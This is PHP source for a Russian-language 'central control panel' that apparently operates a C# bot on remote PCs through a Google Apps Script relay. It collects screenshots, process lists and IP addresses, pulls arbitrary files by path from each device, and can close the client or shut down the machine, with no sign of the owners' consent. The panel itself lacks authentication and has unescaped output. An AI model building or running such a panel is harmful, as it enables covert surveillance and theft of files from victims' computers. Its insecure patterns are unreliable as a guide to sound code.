<?php
ob_start(); 
session_start();
error_reporting(E_ALL); ini_set('display_errors', 1);

// !!! ВСТАВЬ СВОЙ URL GOOGLE SCRIPT НИЖЕ !!!
$api = "https://script.google.com/macros/s/AKfycbwDgR5LEV3rc7kiJjGqsa6IQkX4ZOfPWFcyA2appKMzSt8D4j7xUIPLkGhQRyExYw1P/exec";

// 1. ПРИЕМ ФАЙЛОВ И СКРИНШОТОВ ОТ C# БОТА
if (isset($_POST['screenshot_device_id'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['screenshot_device_id']);
    
    // Если пришел обычный файл
    if (isset($_FILES['downloaded_file'])) {
        $upload_dir = __DIR__ . '/downloads/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        
        $filename = basename($_FILES['downloaded_file']['name']);
        $target_file = $upload_dir . $dev_id . '_' . $filename;
        
        if (move_uploaded_file($_FILES['downloaded_file']['tmp_name'], $target_file)) {
            // Сохраняем имя последнего скачанного файла в сессию для отображения ссылки
            $_SESSION['last_file_' . $dev_id] = $filename;
            echo "SERVER_SAVED_FILE";
        }
        exit;
    }
    
    // If screenshot came
    if (isset($_FILES['screenshot_file'])) {
        $upload_dir = __DIR__ . '/screenshots/';
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0777, true);
        $target_file = $upload_dir . 'screen_' . $dev_id . '.jpg';
        if (move_uploaded_file($_FILES['screenshot_file']['tmp_name'], $target_file)) {
            echo "SERVER_SAVED_SCREENSHOT";
        }
        exit;
    }
}

// 2. СКАЧИВАНИЕ СКРИНШОТОВ И ФАЙЛОВ С ПАНЕЛИ
if (isset($_GET['get_file']) && isset($_GET['dev'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['dev']);
    $filename = basename($_GET['get_file']);
    $file = __DIR__ . '/downloads/' . $dev_id . '_' . $filename;
    
    if (file_exists($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        readfile($file);
    } else { echo "Файл не найден на сервере."; }
    exit;
}

if (isset($_GET['download_screen'])) {
    $dev_id = preg_replace('/[^a-zA-Z0-9_-]/', '', $_GET['download_screen']);
    $file = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
    if (file_exists($file)) {
        header('Content-Type: image/jpeg');
        header('Content-Disposition: attachment; filename="screenshot_'.$dev_id.'.jpg"');
        readfile($file);
    } else { echo "Скриншот не найден."; }
    exit;
}

// 3. УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК КНОПОК
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $action = isset($_POST["action"]) ? trim($_POST["action"]) : ""; 
    $device_id = isset($_POST["device_id"]) ? trim($_POST["device_id"]) : "";
    $file_path = isset($_POST["file_path"]) ? trim($_POST["file_path"]) : "";

    if (!empty($action) && !empty($device_id)) {
        // Если запрашиваем файл, подмешиваем путь к файлу прямо в имя команды через разделитель двух двоеточий `::`
        if ($action === "download_file" && !empty($file_path)) {
            $action = "download_file::" . $file_path;
        }

        $ch = curl_init($api); 
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(["action" => $action, "device_id" => $device_id])); 
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/x-www-form-urlencoded']);
        curl_setopt($ch, CURLOPT_TIMEOUT, 6);
        curl_exec($ch); 
        curl_close($ch);
    }
    header("Location: " . $_SERVER['PHP_SELF']); 
    exit;
}

function getData($url) {
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 6); 
    $res = curl_exec($ch); 
    curl_close($ch);
    return json_decode($res, true) ?: [];
}

$devices = getData($api);
$logs = getData($api . "?get_logs=1");
?>
<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<title>Центральная Панель Управления</title>
<style>
body{ margin:0; font-family:system-ui, sans-serif; background:#090d16; color:#e2e8f0; padding-bottom:50px;}
.header{ padding:18px 24px; background:#0f172a; border-bottom:1px solid #1e293b; font-weight:bold; font-size:19px; display:flex; justify-content:space-between; align-items:center;}
.sync-indicator{ font-size:12px; color:#64748b; display:flex; align-items:center;}
.dot{ width:8px; height:8px; background:#34d399; border-radius:50%; margin-right:8px; animation: pulse 1.5s infinite; }
@keyframes pulse { 0% { opacity: 0.4; } 50% { opacity: 1; } 100% { opacity: 0.4; } }
.container{ padding:24px; display:grid; grid-template-columns:repeat(auto-fill,minmax(320px,1fr)); gap:20px; }
.card{ background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; }
.online-card { border-color: #064e3b; }
.name{ font-weight:700; font-size:17px; margin-bottom:6px; color:#f8fafc;}
.status{ font-size:11px; padding:4px 10px; border-radius:999px; display:inline-block; font-weight:bold; text-transform:uppercase;}
.online{ background:#064e3b; color:#34d399; } .offline{ background:#374151; color:#9ca3af; }
.row{ margin-top:10px; font-size:13px; color:#94a3b8; word-break: break-all;}
button, .btn-link{ width:100%; margin-top:8px; padding:10px; border-radius:8px; border:none; cursor:pointer; font-weight:600; display:block; text-align:center; box-sizing:border-box; text-decoration:none; font-size:13px; transition: 0.2s;}
.blue { background:#4f46e5; color:white; } .blue:hover{ background:#4338ca; }
.green { background:#059669; color:white; } .green:hover{ background:#047857; }
.orange { background:#d97706; color:white; } .orange:hover{ background:#b45309; }
.red { background:#dc2626; color:white; } .red:hover{ background:#b91c1c; }
.gray-danger { background:#374151; color:#f3f4f6; border: 1px solid #4b5563; } .gray-danger:hover{ background:#1f2937; }
input[type="text"] { width:100%; padding:8px; background:#030712; border:1px solid #1f2937; border-radius:6px; color:white; font-size:12px; box-sizing:border-box; margin-top:4px;}
.log-section{ margin:24px; background:#111827; border:1px solid #1f2937; border-radius:14px; padding:20px; overflow-x:auto;}
table{ width:100%; border-collapse:collapse; font-size:13px; margin-top:14px; text-align:left;}
th, td{ padding:12px; border-bottom:1px solid #1f2937; }
th { color:#64748b; font-weight:600; text-transform: uppercase; font-size:11px;}
.badge-log { padding:3px 8px; border-radius:6px; font-size:11px; font-weight:bold;}
.status-waiting { background:#1e3a8a; color:#93c5fd; } .status-success { background:#064e3b; color:#a7f3d0; } .status-error { background:#7f1d1d; color:#fca5a5; }
.process-box { background:#030712; padding:10px; border-radius:8px; border:1px solid #1f2937; font-family:monospace; font-size:11px; color:#10b981; max-height:120px; overflow-y:auto; margin-top:8px; display:none; white-space: pre-wrap; }
</style>
</head>
<body>

<div class="header">
    <span>🖥 Центральная Панель Управления</span>
    <div class="sync-indicator"><span class="dot"></span>Автообновление (10с)</div>
</div>

<div class="container">
    <?php 
    foreach($devices as $d): 
        $dev_id = $d["device_id"] ?? ""; 
        if (empty($dev_id)) continue;

        $time_raw = $d["time"] ?? ""; $last = 0;
        if (!empty($time_raw)) {
            if (preg_match('/(\d{2})\.(\d{2})\.(\d{4})\s(.*)/', $time_raw, $matches)) {
                $time_raw = $matches[3] . "-" . $matches[2] . "-" . $matches[1] . " " . $matches[4];
            }
            $last = @strtotime($time_raw);
        }
        $age = ($last > 0) ? (time() - $last) : 999;
        $isOnline = ($age <= 35 && $last > 0);
        $status_class = $isOnline ? "online" : "offline";
        $status_text = $isOnline ? "В сети" : "Не в сети";
        $card_class = $isOnline ? "online-card" : "";

        if ($last === 0 || $age > 86400) { $time_str = "давно"; }
        elseif ($age < 5) { $time_str = "только что"; } 
        elseif ($age < 60) { $time_str = $age . " сек. назад"; } 
        else { $time_str = floor($age/60) . " мин. назад"; }
    ?>
    <div class="card <?=$card_class?>">
        <div class="name"><?=htmlspecialchars($d["name"] ?? "Неизвестный ПК")?></div>
        <div class="status <?=$status_class?>"><?=$status_text?></div>
        <div class="row"><b>IP:</b> <?=htmlspecialchars($d["ip"] ?? "—")?></div>
        <div class="row"><b>ID железа:</b> <span style="font-family:monospace;"><?=htmlspecialchars($dev_id)?></span></div>
        <div class="row"><b>Активность:</b> <?=$time_str?></div>

        <button type="button" class="blue" onclick="toggleConsole('proc_<?=htmlspecialchars($dev_id)?>')">📟 Открыть консоль процессов</button>
        <div class="process-box" id="proc_<?=htmlspecialchars($dev_id)?>"><?=htmlspecialchars($d["processes"] ?? "Нет данных о процессах.")?></div>

        <hr style="border-color:#1f2937; margin:15px 0;">

        <form method="POST" action="" style="margin-bottom: 6px;">
            <input type="hidden" name="action" value="take_screenshot">
            <input type="hidden" name="device_id" value="<?=htmlspecialchars($dev_id)?>">
            <button type="submit" class="blue">📸 Запросить скриншот</button>
        </form>

        <div style="margin-bottom:12px;">
            <?php 
            $file_path = __DIR__ . '/screenshots/screen_' . $dev_id . '.jpg';
            if (file_exists($file_path)): ?>
                <a href="?download_screen=<?=urlencode($dev_id)?>" class="btn-link green" target="_blank">📥 Скачать скриншот</a>
            <?php else: ?>
                <button style="background:#1f2937; color:#4b5563; cursor:not-allowed;" disabled>Скриншота нет</button>
            <?php endif; ?>
        </div>

        <form method="POST" action="" style="background:#1e293b; padding:10px; border-radius:8px; margin-bottom:6px;">
            <input type="hidden" name="action" value="download_file">
            <input type="hidden" name="device_id" value="<?=htmlspecialchars($dev_id)?>">
            <label style="font-size:11px; color:#94a3b8; font-weight:bold;">Укажите полный путь к файлу на ПК:</label>
            <input type="text" name="file_path" placeholder="C:\folder\file.txt" required>
            <button type="submit" class="blue" style="background:#0284c7;">📥 Запросить этот файл</button>
        </form>

        <div style="margin-bottom:12px;">
            <?php if (isset($_SESSION['last_file_' . $dev_id])): 
                $fname = $_SESSION['last_file_' . $dev_id]; ?>
                <a href="?get_file=<?=urlencode($fname)?>&dev=<?=urlencode($dev_id)?>" class="btn-link green" style="background:#10b981;">💾 Скачать: <?=$fname?></a>
            <?php else: ?>
                <button style="background:#1f2937; color:#4b5563; cursor:not-allowed;" disabled>Файлы не запрашивались</button>
            <?php endif; ?>
        </div>

        <hr style="border-color:#1f2937; margin:15px 0;">

        <form method="POST" action="" style="margin-bottom:6px;">
            <input type="hidden" name="action" value="stop_client">
            <input type="hidden" name="device_id" value="<?=htmlspecialchars($dev_id)?>">
            <button type="submit" class="orange">❌ Закрыть клиента</button>
        </form>

        <form method="POST" action="" style="margin-bottom:6px;">
            <input type="hidden" name="action" value="shutdown">
            <input type="hidden" name="device_id" value="<?=htmlspecialchars($dev_id)?>">
            <button type="submit" class="red">💻 Выключить ПК</button>
        </form>
    </div>
    <?php endforeach; ?>
</div>

<div class="log-section">
    <div class="name" style="font-size:16px; color:#f1f5f9;">📋 Отчет о событиях и командах</div>
    <table>
        <thead>
            <tr><th>ID Задачи</th><th>ID Устройства</th><th>Действие</th><th>Статус</th><th>Лог</th></tr>
        </thead>
        <tbody>
            <?php 
            if(empty($logs)): echo "<tr><td colspan='5' style='text-align:center;'>История пуста</td></tr>";
            else:
                foreach ($logs as $l):
                    if (!isset($l["id"]) || empty($l["device_id"])) continue;
                    $act = $l["action"] ?? "";
                    if (strpos($act, "download_file::") === 0) {
                        $act = "📥 Файл: " . str_replace("download_file::", "", $act);
                    } else {
                        $translateAction = ["take_screenshot" => "📸 Скриншот", "shutdown" => "💻 Выключение", "stop_client" => "❌ Остановка"];
                        $act = $translateAction[$act] ?? $act;
                    }
                    $status = $l["status"] ?? "";
                    $statusText = $status === "1" ? "✅ Выполнено" : ($status === "Ошибка" ? "🛑 Сбой" : "⏳ В очереди");
                    $statusClass = $status === "1" ? "status-success" : ($status === "Ошибка" ? "status-error" : "status-waiting");
            ?>
                <tr>
                    <td><?=htmlspecialchars($l["id"])?></td>
                    <td><?=htmlspecialchars($l["device_id"])?></td>
                    <td><?=$act?></td>
                    <td><span class="badge-log <?=$statusClass?>"><?=$statusText?></span></td>
                    <td><?=htmlspecialchars($l["log"] ?? "")?></td>
                </tr>
            <?php endforeach; endif; ?>
        </tbody>
    </table>
</div>

<script>
function toggleConsole(id) {
    let box = document.getElementById(id);
    box.style.display = (box.style.display === "block") ? "none" : "block";
}
setInterval(function() { location.reload(); }, 10000);
</script>
</body>
</html>
